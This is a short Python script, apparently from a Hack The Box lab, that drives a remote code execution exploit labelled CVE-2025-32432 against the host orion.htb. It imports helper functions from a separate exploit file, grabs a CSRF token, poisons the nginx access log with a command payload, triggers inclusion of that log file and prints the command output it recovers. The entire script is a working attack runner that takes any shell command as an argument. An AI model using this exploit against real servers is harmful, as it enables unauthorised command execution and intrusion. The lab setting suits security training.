#!/usr/bin/env python3
import sys
sys.path.insert(0, "/mnt/c/HTB/Orion/scripts")
src = open("/mnt/c/HTB/Orion/scripts/E32_cdratel_exploit.py").read()
src = src.split("if __name__")[0]
mod = {}
exec(src, mod)

target = "http://orion.htb"
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
asset_id = int(sys.argv[2]) if len(sys.argv) > 2 else 2

csrf = mod["get_csrf"](target)
marker_start, marker_end = "===CVE2025-32432-OUT===", "===CVE2025-32432-END==="
payload = mod["build_payload"](cmd, marker_start, marker_end)
mod["poison"](target, payload)
r = mod["trigger"](target, csrf, asset_id, "/var/log/nginx/access.log")
out = mod["extract_rce_output"](r.text, marker_start, marker_end)
print("OUTPUT:", out)
if out is None:
    print("STATUS:", r.status_code, "LEN:", len(r.text))
    print(r.text[-2000:])
